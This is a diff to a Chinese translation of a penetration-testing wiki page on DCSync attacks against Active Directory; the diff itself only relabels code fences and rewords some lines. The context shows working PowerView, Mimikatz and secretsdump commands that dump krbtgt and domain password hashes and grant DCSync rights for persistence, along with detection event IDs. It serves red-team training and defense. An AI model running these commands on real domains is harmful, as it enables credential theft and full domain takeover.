@@ -15,15 +15,15 @@
 ### Enumeration
 
 使用 `powerview` 检查谁拥有这些权限：
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 ### 本地利用
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 ### 远程利用
-```powershell
+```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
@@ -35,28 +35,28 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 - 一个包含 **Kerberos 密钥**
 - 一个包含 NTDS 中任何设置了 [**可逆加密**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) 的帐户的明文密码。您可以通过以下命令获取具有可逆加密的用户：
 
-```powershell
+```bash
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
 ### 持久性
 
 如果您是域管理员，您可以借助 `powerview` 将此权限授予任何用户：
-```powershell
+```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
 然后，您可以**检查用户是否正确分配**了这3个权限，通过在输出中查找它们（您应该能够在“ObjectType”字段中看到权限的名称）：
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### 缓解措施
 
-- 安全事件 ID 4662（对象的审计策略必须启用）– 对一个对象执行了操作
-- 安全事件 ID 5136（对象的审计策略必须启用）– 目录服务对象被修改
-- 安全事件 ID 4670（对象的审计策略必须启用）– 对象的权限被更改
-- AD ACL 扫描器 - 创建和比较 ACL 的创建报告。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
+- Security Event ID 4662 (对象的审计策略必须启用) – 对一个对象执行了操作
+- Security Event ID 5136 (对象的审计策略必须启用) – 目录服务对象被修改
+- Security Event ID 4670 (对象的审计策略必须启用) – 对象的权限被更改
+- AD ACL Scanner - 创建和比较 ACL 的报告。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
-## 参考文献
+## 参考
 
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
